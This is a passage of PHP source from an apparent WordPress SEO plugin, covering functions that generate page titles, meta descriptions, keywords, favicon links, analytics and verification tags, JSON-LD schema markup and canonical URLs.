                    $this->title .= $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }
            } elseif (is_tag()) { //for tags
                if (is_paged()) {
                    $tag = get_query_var('tag');
                    $this->title = ucfirst(str_replace('-', ' ', $tag)) . $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }
            } elseif (is_archive()) { //for archive and products
                if (isset($this->post) && isset($this->post->ID)) {
                    $this->title = $this->grabTitleFromPost($this->post->ID);

                    //if woocommerce is installed and is a product category
                    if (function_exists('is_product_category') && is_product_category()) {
                        global $wp_query;
                        $cat = $wp_query->get_queried_object();
                        if (!empty($cat) && $cat->name <> '') {
                            $this->title = $cat->name;
                        }
                    } else {
                        $cat = get_the_terms($this->post->ID, 'category');
                        if (!empty($cat)) {
                            $this->title .= $sep . $cat[0]->name;
                        }
                    }
                }

                if (is_paged()) {
                    $this->title .= $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }
            } elseif (is_single() || is_page() || is_singular() || in_array(get_post_type(), $this->post_type)) {
                if (isset($this->post) && isset($this->post->ID)) {
                    //is a post page
                    $this->title = $this->grabTitleFromPost($this->post->ID);

                    //if woocommerce is installed and is a product
                    if (function_exists('is_product') && is_product()) {
                        $cat = get_the_terms($this->post->ID, 'product_cat');
                        if (!empty($cat) && count($cat) > 1) {
                            $this->title .= $sep . $cat[0]->name;
                        }
                    }
                }
            }

            //If title then clear it and truncate it
            if ($this->title <> '') {
                $this->title = $this->truncate($this->title, $this->min_title_length, $this->max_title_length);
            }
        } elseif (SQ_Tools::$options ['sq_auto_title'] == 1) { /* Check if is a predefined Title for home page */

            //If the home page is a static page that has custom snippet
            if (is_page() && isset($this->post) && isset($this->post->ID) && $this->getAdvancedMeta($this->post->ID, 'title') <> '') {
                $this->title = $this->getAdvancedMeta($this->post->ID, 'title');
            } elseif (SQ_Tools::$options['sq_fp_title'] <> '') {
                $this->title = SQ_Tools::$options['sq_fp_title'];
            } else {
                if (isset($this->post->ID)) {
                    $this->title = $this->grabTitleFromPost($this->post->ID);
                    if ($this->title <> "" && $this->meta['blogname'] <> '') {
                        $this->title .= $sep . $this->meta['blogname'];
                    }
                } else {
                    $this->title = get_the_title();
                }
            }
        }
        return apply_filters('sq_title', $this->title);
    }

    public function clearTitle($title)
    {
        if ($title <> '') {
            $title = SQ_Tools::i18n(trim(esc_html(ent2ncr(strip_tags($title)))));
        }
        return $title;
    }

    /**
     * Get the image from content
     * @global type $wp_query
     * @param integer $id Post ID
     * @return type
     */
    public function getImagesFromContent($id = null, $all = false)
    {
        $images = array();
        if (isset($id)) {
            $post = get_post($id);
        } else {
            $post = $this->post;
        }

        if ($post && isset($post->ID)) {
            if ($url = $this->getAdvancedMeta($post->ID, 'ogimage')) {
                $images[] = array(
                    'src' => esc_url($url),
                    'title' => $this->clearTitle($this->grabTitleFromPost($post->ID)),
                    'description' => $this->clearDescription($this->grabDescriptionFromPost($post->ID)),
                    'width' => null,
                    'height' => null,
                );
            }
            if ($all || empty($images)) {
                if (has_post_thumbnail($post->ID)) {
                    $attachment = get_post(get_post_thumbnail_id($post->ID));
                    $url = wp_get_attachment_image_src($attachment->ID, 'full');
                    $images[] = array(
                        'src' => esc_url($url[0]),
                        'title' => $this->clearTitle($attachment->post_title),
                        'description' => $this->clearDescription($attachment->post_excerpt),
                        'width' => $url[1],
                        'height' => $url[2],
                    );
                }
            }
            if ($all || empty($images)) {
                if (isset($post->post_content)) {
                    preg_match('/<img[^>]*src="([^"]*)"[^>]*>/i', $post->post_content, $match);

                    if (!empty($match)) {
                        preg_match('/alt="([^"]*)"/i', $match[0], $alt);

                        if (strpos($match[1], '//') === false) {
                            $match[1] = get_bloginfo('url') . $match[1];
                        }

                        $images[] = array(
                            'src' => esc_url($match[1]),
                            'title' => $this->clearTitle(!empty($alt[1]) ? $alt[1] : ''),
                            'description' => '',
                            'width' => null,
                            'height' => null,
                        );
                    }
                }
            }
        }

        return $images;
    }

    /**
     * Get the video from content
     * @param integer $id Post ID
     * @return type
     */
    public function getVideosFromContent($id = null)
    {
        $videos = array();

        if (isset($id)) {
            $post = get_post($id);
        } else {
            $post = $this->post;
        }

        if ($post && isset($post->ID)) {
            if (isset($post->post_content)) {
                preg_match('/(?:http(?:s)?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed)\/)([^\?&\"\'>\s]+)/si', $post->post_content, $match);

                if (isset($match[0])) {
                    if (strpos($match[0], '//') !== false && strpos($match[0], 'http') === false) {
                        $match[0] = 'http:' . $match[0];
                    }
                    $videos[] = esc_url($match[0]);
                }

//                preg_match('/(?:http(?:s)?:\/\/)?(?:fast\.wistia\.net\/(?:embed)\/(?:iframe)\/)([^\?&\"\'>\s]+)/si', $post->post_content, $match);
//
//                if (isset($match[0])) {
//                    if (strpos($match[0], '//') !== false && strpos($match[0], 'http') === false) {
//                        $match[0] = 'http:' . $match[0];
//                    }
//                    $videos[] = esc_url($match[0]);
//                }

                preg_match('/(?:http(?:s)?:\/\/)?(?:fwd4\.wistia\.com\/(?:medias)\/)([^\?&\"\'>\s]+)/si', $post->post_content, $match);

                if (isset($match[0])) {
                    $videos[] = esc_url('http://fast.wistia.net/embed/iframe/' . $match[1]);
                }

                preg_match('/class=["|\']([^"\']*wistia_async_([^\?&\"\'>\s]+)[^"\']*["|\'])/si', $post->post_content, $match);

                if (isset($match[0])) {
                    $videos[] = esc_url('http://fast.wistia.net/embed/iframe/' . $match[2]);
                }

                preg_match('/src=["|\']([^"\']*(.mpg|.mpeg|.mp4|.mov|.wmv|.asf|.avi|.ra|.ram|.rm|.flv)["|\'])/i', $post->post_content, $match);

                if (isset($match[1])) {
                    $videos[] = esc_url($match[1]);
                }
            }
        }

        return $videos;
    }

    public function getDescription()
    {
        $this->getCustomDescription();
        return $this->description;
    }

    /**
     * Get the description from last/current article
     *
     * @return string
     */
    public function getCustomDescription()
    {

        $sep = ' | ';
        $description = '';

        //If not homepage
        if (!$this->isHomePage()) {
            //If is a category
            if (is_category()) { //for categories
                $category = get_category(get_query_var('cat'), false);
                $description = $category->category_description;
                if ($description == '') {
                    $description = $category->cat_name;
                }
                if ($description == '') {
                    $description = $this->grabDescriptionFromPost();
                }

                if (is_paged()) {
                    $description .= $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }

                if ($this->isHomePage() && $description <> '') {
                    if ($this->meta['blogname'] <> '') {
                        $description .= $sep . $this->meta['blogname'];
                    }
                }
            } elseif (is_author()) { //for author
                $description = $this->getAuthor('user_description');
                if ($description == '') {
                    $description = $this->grabDescriptionFromPost() . $sep . $this->getAuthor('display_name');
                }
                if (is_paged()) {
                    $description .= $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }
            } elseif (is_tag()) { //for tags
                $description = tag_description();
                if ($description == '') {
                    $tag = single_tag_title('', false);
                    $description = ucfirst($tag) . $sep . $this->grabDescriptionFromPost();
                }
                if (is_paged()) {
                    $description .= $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }
            } elseif (is_archive()) { //for archive and products
                if (isset($this->post) && isset($this->post->ID)) {
                    $description = $this->grabDescriptionFromPost($this->post->ID);

                    //if woocommerce is installed and is a product category
                    if (function_exists('is_product_category') && is_product_category()) {
                        global $wp_query;
                        $cat = $wp_query->get_queried_object();
                        if (!empty($cat)) {
                            if ($cat->description <> '' && strlen($cat->description) > 10) {
                                $description = $cat->description;
                            } else {
                                $description .= $sep . $cat->name;
                            }
                        }
                    } else {
                        $cat = get_the_terms($this->post->ID, 'category');
                        if (!empty($cat)) {
                            $description .= $sep . $cat[0]->name;
                        }
                    }
                }

                if (is_paged()) {
                    $description .= $sep . __('Page', _SQ_PLUGIN_NAME_) . " " . get_query_var('paged');
                }
            } elseif (is_single() || is_page() || is_singular() || $this->checkPostsPage() || in_array(get_post_type(), $this->post_type)) {
                if (isset($this->post) && isset($this->post->ID)) {
                    //is a post page
                    $description .= $this->grabDescriptionFromPost($this->post->ID);

                    //if woocommerce is installed and is a product
                    if (function_exists('is_product') && is_product()) {
                        $cat = get_the_terms($this->post->ID, 'product_cat');
                        if (!empty($cat) && count($cat) > 1) {
                            $description .= $sep . $cat[0]->name;
                        }
                    }
                }
            }
        } else

            /* Check if is a predefined TitleIn Snippet */
            if (SQ_Tools::$options['sq_auto_description'] == 1) {

                //If the home page is a static page that has custom snippet
                if (is_page() && isset($this->post) && isset($this->post->ID) && $this->getAdvancedMeta($this->post->ID, 'description') <> '') {
                    $description = $this->getAdvancedMeta($this->post->ID, 'description');
                } elseif (SQ_Tools::$options ['sq_fp_description'] <> '') {
                    $description = strip_tags(SQ_Tools::$options['sq_fp_description']);
                } else {
                    $description = $this->grabDescriptionFromPost();
                }
            }

        $description = (($description <> '') ? $description : $this->title);
        if ($description <> '') {

            $this->description = apply_filters('sq_description', $description);
            if ($this->description <> '') { //prevent blank description
                return sprintf("<meta name=\"description\" content=\"%s\" />", $this->description);
            }
        }

        return '';
    }

    public function clearDescription($description)
    {
        if ($description <> '') {
            $search = array("'<script[^>]*?>.*?<\/script>'si", // strip out javascript
                "/<form.*?<\/form>/si",
                "/<iframe.*?<\/iframe>/si");

            if (function_exists('preg_replace')) {
                $description = preg_replace($search, '', $description);
            }

            $description = SQ_Tools::i18n(trim(esc_html(ent2ncr(strip_tags($description)))));
        }

        return $description;
    }

    /**
     * Get the keywords from articles
     *
     * @return string
     */
    private function getCustomKeyword()
    {
        $keywords = '';

        if ($this->checkPostsPage() && SQ_Tools::$options['sq_auto_description'] == 1) {
            $keywords = stripcslashes(SQ_Tools::i18n($this->grabKeywordsFromPost($this->post->ID)));
        } elseif (is_single() || is_page()) {
            $keywords = stripcslashes(SQ_Tools::i18n($this->grabKeywordsFromPost($this->post->ID)));
        } elseif (SQ_Tools::$options['sq_auto_description'] == 1) {
            $keywords = trim(SQ_Tools::i18n($this->grabKeywordsFromPost()));
        }

        /* Check if is a predefined Keyword */
        if (SQ_Tools::$options['sq_auto_description'] == 1) { //
            if (($this->isHomePage() &&
                SQ_Tools::$options['sq_fp_keywords'] <> '')
            ) {
                $keywords = strip_tags(SQ_Tools::$options ['sq_fp_keywords']);
            }
        }

        if (isset($keywords) && !empty($keywords) && !(is_home() && is_paged())) {
            $this->keywords = apply_filters('sq_keywords', str_replace('"', '', $keywords));

            return sprintf("<meta name=\"keywords\" content=\"%s\" />", $this->keywords);
        }

        return false;
    }

    /**
     * Get the copyright meta
     *
     * @return string
     */
    private function getCopyright()
    {
        $meta = '';

        $name = $this->getAuthor('display_name');
        if ($name == '') {
            $name = $this->meta['blogname'];
        }

        if ($name <> '') {
            $meta = sprintf("<meta name=\"dcterms.rightsHolder\" content=\"%s\" />" . "\n", apply_filters('sq_copyright', $name));
        }

        return apply_filters('sq_copyright_meta', $meta);
    }

    /**
     * Get the Google Plus Author meta
     *
     * @return string
     */
    private function getGooglePlusMeta()
    {
        $meta = '';
        $author = SQ_Tools::$options['sq_google_plus'];

        if (strpos($author, 'plus.google.com') === false && is_numeric($author)) {
            $author = 'https://plus.google.com/' . $author;
        }

        if ($author <> '' && !class_exists('ABH_Classes_ObjController')) {
            $meta = '<link rel="publisher" href="' . $author . '" />' . "\n";
        }

        return apply_filters('sq_publisher_meta', $meta);
    }

    /**
     * Get the icons for serachengines
     *
     * @return string
     */
    private function getFavicon()
    {
        $meta = '';
        $rnd = '';

        if (current_user_can('manage_options')) {
            $rnd = '?' . md5(SQ_Tools::$options['favicon']);
        }

        if (SQ_Tools::$options['favicon'] <> '' && file_exists(_SQ_CACHE_DIR_ . SQ_Tools::$options['favicon'])) {
            $meta .= "\n";

            if (!get_option('permalink_structure')) {
                $favicon = get_bloginfo('wpurl') . '/index.php?sq_get=favicon';
                $touchicon = get_bloginfo('wpurl') . '/index.php?sq_get=touchicon';
            } else {
                $favicon = get_bloginfo('wpurl') . '/favicon.icon' . $rnd;
                $touchicon = get_bloginfo('wpurl') . '/touch-icon.png' . $rnd;
            }
            $meta .= sprintf("<link rel=\"shortcut icon\"  href=\"%s\" />" . "\n", $favicon);
            $meta .= sprintf("<link rel=\"apple-touch-icon\"  href=\"%s\" />" . "\n", $touchicon);

            $appleSizes = preg_split('/[,]+/', _SQ_MOBILE_ICON_SIZES);
            foreach ($appleSizes as $size) {
                if (!get_option('permalink_structure')) {
                    $favicon = get_bloginfo('wpurl') . '/index.php?sq_get=touchicon&sq_size=' . $size;
                } else {
                    $favicon = get_bloginfo('wpurl') . '/touch-icon' . $size . '.png' . $rnd;
                }
                $meta .= sprintf("<link rel=\"apple-touch-icon\" sizes=\"" . $size . "x" . $size . "\"  href=\"%s\" />" . "\n", $favicon);
            }
        } else {
            if (file_exists(ABSPATH . 'favicon.ico')) {
                $meta .= sprintf("<link rel=\"shortcut icon\"  href=\"%s\" />" . "\n", get_bloginfo('wpurl') . '/favicon.ico');
            }
        }
        return apply_filters('sq_publisher_meta', $meta);
    }

    /**
     * Get the language meta
     *
     * @return string
     */
    private function getLanguage()
    {
        $meta = '';
        $language = get_bloginfo('language');

        if ($language <> '') {
            $url = get_bloginfo('url');
            if (strpos($language, '-') !== false) {
                $hreflang = substr($language, 0, strpos($language, '-'));
            }


            $meta .= sprintf("<meta name=\"dc.language\" content=\"%s\" />", $language) . "\n";
        }

        return apply_filters('sq_language_meta', $meta);
    }

    /**
     * Get the DC.publisher meta
     *
     * @return string
     */
    private function getDublinCore()
    {
        $date = null;
        $meta = '';

        $name = $this->getAuthor('display_name');
        if (!$name) {
            $name = $this->meta['blogname'];
        }

        if ($name <> '') {
            $meta .= sprintf("<meta name=\"dc.publisher\" content=\"%s\" />", $name) . "\n";
        }

        $meta .= sprintf('<meta name="dc.title" content="%s" />', $this->title) . "\n";
        $meta .= sprintf('<meta name="dc.description" content="%s" />', $this->description) . "\n";

        if ($this->isHomePage()) {
            $date = date('Y-m-d', strtotime(get_lastpostmodified('gmt')));
        } elseif (is_single() && isset($this->post->post_date)) {
            $date = date('Y-m-d', strtotime($this->post->post_date));
        }

        if (isset($date)) {
            $meta .= sprintf("<meta name=\"dc.date.issued\" content=\"%s\" />", $date) . "\n";
        }

        return apply_filters('sq_dublin_meta', $meta);
    }

    /**
     * Get the XML Sitemap meta
     *
     * @return string
     */
    private function getXMLSitemap()
    {
        $meta = '';

        $xml_url = SQ_ObjController::getController('SQ_Sitemaps')->getXmlUrl('sitemap');

        if ($xml_url <> '') {
            $meta = sprintf("<link rel=\"alternate\" type=\"application/rss+xml\" " . (($this->title <> '') ? "title=\"%s\"" : "") . " href=\"%s\" />", $this->title, $xml_url) . "\n";
        }

        return apply_filters('sq_sitemap_meta', $meta);
    }

    /**
     * Get the google Webmaster Tool code
     *
     * @return string
     */
    private function getGoogleWT()
    {
        $sq_google_wt = SQ_Tools::$options['sq_google_wt'];

        if ($this->isHomePage() && $sq_google_wt <> '') {
            return sprintf("<meta name=\"google-site-verification\" content=\"%s\" />", $sq_google_wt) . "\n";
        }

        return false;
    }

    /**
     * Get the google Analytics code
     *
     * @return string
     */
    private function getGoogleAnalytics()
    {
        $sq_google_analytics = SQ_Tools::$options['sq_google_analytics'];

        if ($sq_google_analytics <> '') {
            SQ_ObjController::getController('SQ_DisplayController', false)
                ->loadMedia('https://www.google-analytics.com/analytics.js');

            return sprintf("<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', '%s', 'auto');
  ga('send', 'pageview');

</script>", $sq_google_analytics);
        }

        return false;
    }

    /**
     * Get the Facebook Insights code
     *
     * @return string
     */
    private function getFacebookIns()
    {
        $sq_facebook_insights = SQ_Tools::$options ['sq_facebook_insights'];

        if ($this->isHomePage() && $sq_facebook_insights <> '') {
            return sprintf("<meta property=\"fb:admins\" content=\"%s\" />", $sq_facebook_insights) . "\n";
        }

        return false;
    }

    /**
     * Get the Pinterest code
     *
     * @return string
     */
    private function getPinterest()
    {
        $sq_pinterest = SQ_Tools::$options['sq_pinterest'];

        if ($this->isHomePage() && $sq_pinterest <> '') {
            return sprintf("<meta name=\"p:domain_verify\" content=\"%s\" />", $sq_pinterest) . "\n";
        }

        return false;
    }

    /**
     * Get the Alexa Tool code
     *
     * @return string
     */
    private function getAlexaT()
    {
        $sq_alexa = SQ_Tools::$options['sq_alexa'];

        if ($this->isHomePage() && $sq_alexa <> '') {
            return sprintf("<meta name=\"alexaVerifyID\" content=\"%s\" />", $sq_alexa) . "\n";
        }

        return false;
    }

    /**
     * Get the bing Webmaster Tool code
     *
     * @return string
     */
    private function getBingWT()
    {
        $sq_bing_wt = SQ_Tools::$options['sq_bing_wt'];

        if ($this->isHomePage() && $sq_bing_wt <> '') {
            return sprintf("<meta name=\"msvalidate.01\" content=\"%s\" />", $sq_bing_wt) . "\n";
        }

        return false;
    }

    /**
     * Get the JsonLD meta for this site
     * @return string
     */
    private function getJsonLD()
    {
        $meta = '';
        $sep = ",\n";
        if ($this->isHomePage()) {
            if (isset(SQ_Tools::$options['sq_jsonld'][SQ_Tools::$options['sq_jsonld_type']])) {
                $meta .= '"@type":"' . SQ_Tools::$options['sq_jsonld_type'] . '"' . $sep;
                $meta .= '"url": "' . $this->url . '"';
                foreach (SQ_Tools::$options['sq_jsonld'][SQ_Tools::$options['sq_jsonld_type']] as $key => $value) {
                    if ($value <> '') {
                        if (SQ_Tools::$options['sq_jsonld_type'] == 'Organization' && $key == 'contactType') {
                            continue;
                        }
                        if (SQ_Tools::$options['sq_jsonld_type'] == 'Organization' && $key == 'telephone') {
                            $meta .= $sep . '"contactPoint": {"@type": "ContactPoint", "telephone": "' . $value . '", "contactType": "' . SQ_Tools::$options['sq_jsonld'][SQ_Tools::$options['sq_jsonld_type']]['contactType'] . '"}';
                        }

                        if ($key == 'logo') {
                            if (SQ_Tools::$options['sq_jsonld_type'] == 'Person') {
                                $key = 'image';
                            }
                            $value = '{"@type": "ImageObject","url": "' . $value . '"}';
                        } else {
                            $value = '"' . $value . '"';
                        }
                        $meta .= ($meta <> '' ? $sep : '') . '"' . $key . '":' . $value . '';
                    }
                }
            }

            if ($meta <> '') {
                $social = '';
                if (isset(SQ_Tools::$options['sq_twitter_account'])) {
                    $social .= ($social <> '' ? "," : '') . '"' . SQ_Tools::$options['sq_twitter_account'] . '"';
                }
                if (isset(SQ_Tools::$options['sq_facebook_account'])) {
                    $social .= ($social <> '' ? "," : '') . '"' . SQ_Tools::$options['sq_facebook_account'] . '"';
                }
                if (isset(SQ_Tools::$options['sq_google_plus'])) {
                    $social .= ($social <> '' ? "," : '') . '"' . SQ_Tools::$options['sq_google_plus'] . '"';
                }
                if (isset(SQ_Tools::$options['sq_linkedin_account'])) {
                    $social .= ($social <> '' ? "," : '') . '"' . SQ_Tools::$options['sq_linkedin_account'] . '"';
                }

                $search = $sep . '"potentialAction": { "@type": "SearchAction", "target": "' . get_bloginfo('url') . '?s={search_string}", "query-input": "required name=search_string" }';

                if ($social <> '') {
                    $social = $sep . '"sameAs": [' . $social . ']';
                }

                $meta = '{ "@context": "http://schema.org"' . $sep . $meta . $search . $social . '}';
            }
        } elseif (is_single()) {
            $meta .= '"@type": "Article"' . $sep;
            if (isset($this->title)) {
                $meta .= '"name": "' . $this->title . '"' . $sep;
            }
            if (isset($this->description)) {
                $meta .= '"headline": "' . $this->description . '"' . $sep;
            }
            $meta .= '"url": "' . $this->url . '"' . $sep;
            $meta .= '"mainEntityOfPage": { "@type": "WebPage", "url": "' . $this->url . '" }' . $sep;

            if (!empty($this->thumb_images)) {
                $meta .= '"thumbnailUrl": "' . $this->thumb_images[0]['src'] . '"' . $sep;
            }
            if (isset($this->post->post_date)) {
                $meta .= '"datePublished": "' . date('c', strtotime($this->post->post_date)) . '"' . $sep;
            }
            if (isset($this->post->post_modified)) {
                $meta .= '"dateModified": "' . date('c', strtotime($this->post->post_modified)) . '"' . $sep;
            }
            if (!empty($this->thumb_images)) {
                foreach ($this->thumb_images as $image) {
                    //$meta .= '"image": "' . $image['src'] . '"' . $sep;
                    $meta .= '"image": {
                                "@type": "ImageObject",
                                "url": "' . $image['src'] . '",
                                "height": ' . ((isset($image['height']) && $image['height'] <> '') ? (int)$image['height'] : 500) . ',
                                "width": ' . ((isset($image['width']) && $image['width'] <> '') ? (int)$image['width'] : 700) . '
                              }' . $sep;
                    break;
                }
            }
            $meta .= '"author": {"@type": "Person", "url": "' . $this->getAuthor('user_url') . '", "name": "' . $this->getAuthor('display_name') . '"}' . $sep;
            if (SQ_Tools::$options['sq_jsonld_type'] == 'Organization' && isset(SQ_Tools::$options['sq_jsonld'][SQ_Tools::$options['sq_jsonld_type']])) {
                $meta .= '"publisher": {';
                $meta .= '"@type":"' . SQ_Tools::$options['sq_jsonld_type'] . '"' . $sep;
                $meta .= '"url": "' . $this->url . '"';
                foreach (SQ_Tools::$options['sq_jsonld'][SQ_Tools::$options['sq_jsonld_type']] as $key => $value) {
                    if ($value <> '') {
                        if ($key == 'contactType' || $key == 'telephone') {
                            continue;
                        }

                        if ($key == 'logo') {
                            $value = '{"@type": "ImageObject","url": "' . $value . '"}';
                        } else {
                            $value = '"' . $value . '"';
                        }
                        $meta .= ($meta <> '' ? $sep : '') . '"' . $key . '":' . $value . '';
                    }
                }
                $meta .= '}' . $sep;
            }
            $meta .= '"keywords": ["' . str_replace(',', '","', $this->grabKeywordsFromPost()) . '"]';

            $meta = '{ "@context": "http://schema.org"' . $sep . $meta . '}';
        } elseif (is_author()) {
            $meta .= '"@type": "Person"' . $sep;
            $meta .= '"name": "' . $this->getAuthor('display_name') . '"' . $sep;
            $meta .= '"url": "' . $this->getAuthor('user_url') . '"';

            $meta = '{ "@context": "http://schema.org"' . $sep . $meta . '}';
        }

        if ($meta <> '') {
            $meta = "\n" . '<script type="application/ld+json">' . "\n" . $meta . "\n" . '</script>';
        }

        return apply_filters('sq_sjon_ld_meta', $meta);
    }

    /**
     * *******************************************************************
     * ******************************************************************** */

    /**
     * Get the title from the curent/last post
     *
     * @return string
     */
    public function grabTitleFromPost($id = null)
    {
        global $wp_query;
        $post = null;
        $title = '';
        $advtitle = '';

        if (isset($id)) {
            $post = get_post($id);
        }

        if (!$post) {
            if (!empty($wp_query->posts))
                foreach ($wp_query->posts as $post) {
                    $id = (is_attachment()) ? ($post->post_parent) : ($post->ID);
                    $post = get_post($id);

                    break;
                }
        }

        if ($post) {
            if (!$this->isHomePage())
                $title = SQ_Tools::i18n($post->post_title);

            //If there is title saved in database
            if ($advtitle = $this->getAdvancedMeta($post->ID, 'title')) {
                $title = SQ_Tools::i18n($advtitle);
            } elseif ($advtitle = $this->getOtherPluginsMeta($post->ID, 'title')) {
                $title = SQ_Tools::i18n($advtitle);
            }
        }

        return $title;
    }

    /**
     * Get the description from the curent/last post
     *
     * @return string
     */
    public function grabDescriptionFromPost($id = null)
    {
        global $wp_query;
        $post = null;

        if (isset($id)) {
            $post = get_post($id);
        }

        $description = '';
        $advdescription = '';
        //echo 'post: ' . get_the_ID();
        if (!$post) {
            if (!empty($wp_query->posts))
                foreach ($wp_query->posts as $post) {
                    $id = (is_attachment()) ? ($post->post_parent) : ($post->ID);
                    $post = get_post($id);
                    break;
                }
        }


        if ($post) {
            if (!$this->isHomePage()) {
                $description = $this->_truncate(SQ_Tools::i18n($post->post_excerpt), $this->min_description_length, $this->max_description_length);
                if (!$description) {
                    $description = $this->truncate(SQ_Tools::i18n($post->post_content), $this->min_description_length, $this->max_description_length);
                }
            }

            //If there is description saved in database
            if ($advdescription = $this->getAdvancedMeta($post->ID, 'description')) {
                $description = SQ_Tools::i18n($advdescription);
            } elseif ($advdescription = $this->getOtherPluginsMeta($post->ID, 'description')) {
                $description = SQ_Tools::i18n($advdescription);
            }
        }
        // "internal whitespace trim"

        $description = preg_replace("/\s\s+/u", " ", $description);

        return $description;
    }

    /**
     * Get the keywords from the curent/last post and from density
     *
     * @return array
     */
    public function grabKeywordsFromPost($id = null)
    {
        global $wp_query;

        $this->max_keywords = ($this->max_keywords > 0 ? ($this->max_keywords - 1) : 0);
        if ($this->max_keywords == 0) {
            return;
        }

        $keywords = array();
        $advkeywords = '';


        if (isset($id) && $post = get_post($id)) {
            $density = array();

            if (SQ_Tools::$options['sq_keywordtag'] == 1) {
                foreach (wp_get_post_tags($id) as $keyword) {
                    $keywords[] = SQ_Tools::i18n($keyword->name);
                }
            } else {
                if ($json = SQ_ObjController::getModel('SQ_Post')->getKeyword($post->ID)) {
                    if (isset($json->keyword)) {
                        $keywords[] = SQ_Tools::i18n($json->keyword);
                    }
                }
            }

            if (count($keywords) <= $this->max_keywords) {
                if ($advkeywords = $this->getAdvancedMeta($post->ID, 'keywords')) {
                    $keywords[] = SQ_Tools::i18n($advkeywords);
                }
            }
            if (sizeof($keywords) > $this->max_keywords) {
                $keywords = array_slice($keywords, 0, $this->max_keywords);
            }
        } else {
            if (is_404()) {
                return null;
            }

            if (!is_home() && !is_page() && !is_single() && !$this->checkFrontPage() && !$this->checkPostsPage()) {
                return null;
            }

            if (is_home()) {
                if (isset($wp_query->posts) && !empty($wp_query->posts)) {
                    $posts = (array)$wp_query->posts;

                    if (SQ_Tools::$options['sq_keywordtag'] == 1) {
                        foreach ($posts as $post) {
                            foreach (wp_get_post_tags($post->ID) as $keyword) {
                                $keywords[] = SQ_Tools::i18n($keyword->name);
                            }
                        }
                    }

                    if (sizeof($keywords) > $this->max_keywords) {
                        $keywords = array_slice($keywords, 0, $this->max_keywords);
                    }
                }
            }
            if (count($keywords) <= $this->max_keywords) {
                if (isset($wp_query->posts) && !empty($wp_query->posts)) {
                    $posts = (array)$wp_query->posts;

                    foreach ($posts as $post) {
                        $id = (is_attachment()) ? ($post->post_parent) : ($post->ID);

                        if (SQ_Tools::$options['sq_keywordtag'] == 1) {
                            foreach (wp_get_post_tags($id) as $keyword) {
                                $keywords[] = SQ_Tools::i18n($keyword->name);
                            }
                        }
// autometa
                        $autometa = stripcslashes(get_post_meta($id, 'autometa', true));
                        //$autometa = stripcslashes(get_post_meta($post->ID, "autometa", true));
                        if (isset($autometa) && !empty($autometa)) {

                            $autometa_array = explode(' ', $autometa);
                            foreach ($autometa_array as $e) {
                                $keywords[] = SQ_Tools::i18n($e);
                            }
                        }
                    }
                }
            }
        }

        //If there are keywords saved in database
        if ($advkeywords = $this->getAdvancedMeta($post->ID, 'keyword')) {
            $keywords[] = SQ_Tools::i18n($advkeywords);
        }

        //If there are keywords in other plugins
        if ($advkeywords = $this->getOtherPluginsMeta($post->ID, 'keyword')) {
            $keywords[] = SQ_Tools::i18n($advkeywords);
        }

        return $this->getUniqueKeywords($keywords);
    }

    /**
     * Find the correct canonical url
     *
     * @return string
     */
    public function getCanonicalUrl()
    {
        global $wp_query;

        if (isset($this->url)) {
            return $this->url;
        }

        if (!isset($wp_query) || is_404() || is_search()) {
            return false;
        }

        if (isset($this->post->ID) && $link = $this->getAdvancedMeta($this->post->ID, 'canonical')) {
            if ($link <> '') {
                return apply_filters('sq_canonical', $link);
            }
        }

        $haspost = (count($wp_query->posts) > 0);
        $has_ut = function_exists('user_trailingslashit');

        if (get_query_var('m') <> '') {
            $m = preg_replace('/[^0-9]/', '', get_query_var('m'));
            switch (strlen($m)) {
                case 4:
                    $link = get_year_link($m);
                    break;
                case 6:
                    $link = get_month_link(substr($m, 0, 4), substr($m, 4, 2));
                    break;
                case 8:
                    $link = get_day_link(substr($m, 0, 4), substr($m, 4, 2), substr($m, 6, 2));
                    break;
                default:
                    return false;
            }
        } elseif ((is_single() || is_page()) && $haspost) {
            $post = $wp_query->posts[0];
            $link = get_permalink($post->ID);
            $link = $this->getPaged($link);
        } elseif ((is_single() || is_page()) && $haspost) {
            $post = $wp_query->posts[0];
            $link = get_permalink($post->ID);
            $link = $this->getPaged($link);
        } elseif (is_author() && $haspost) {
            $link = $this->getAuthor('user_url');
        } elseif (is_category() && $haspost) {
            $link = $this->getPaged(get_category_link(get_query_var('cat')));
        } else if (is_tag() && $haspost) {
            $tag = get_term_by('slug', get_query_var('tag'), 'post_tag');
            if (!empty($tag->term_id)) {
                $link = get_tag_link($tag->term_id);
            }
            $link = $this->getPaged($link);
        } elseif (is_day() && $haspost) {
            $link = get_day_link(get_query_var('year'), get_query_var('monthnum'), get_query_var('day'));
        } elseif (is_month() && $haspost) {
            $link = get_month_link(get_query_var('year'), get_query_var('monthnum'));
        } elseif (is_year() && $haspost) {
            $link = get_year_link(get_query_var('year'));
        } elseif (is_home()) {
            if ((get_option('show_on_front') == 'page') && ($pageid = get_option('page_for_posts'))) {
                $link = trailingslashit($this->getPaged(get_permalink($pageid)));
            } else {
                if (function_exists('icl_get_home_url')) {
                    $link = icl_get_home_url();
                } else {
                    $link = get_option('home');
                }
                $link = trailingslashit($this->getPaged($link));
            }
        } elseif (is_tax() && $haspost) {
            $taxonomy = get_query_var('taxonomy');
            $term = get_query_var('term');
            $link = $this->getPaged(
                get_term_link($term, $taxonomy));
        } else {
            return false;
        }

        return apply_filters('sq_canonical', $link);
    }

    public function getAuthor($what = 'user_nicename')
    {
        if (!isset($this->author)) {
            if (is_author()) {
                $this->author = get_userdata(get_query_var('author'));
            } elseif (is_single() && isset($this->post->post_author)) {
                $this->author = get_userdata((int)$this->post->post_author)->data;
            }
        }

        if (isset($this->author)) {

            if ($what == 'user_url' && $this->author->$what == '') {
                return get_author_posts_url($this->author->ID, $this->author->user_nicename);
            }
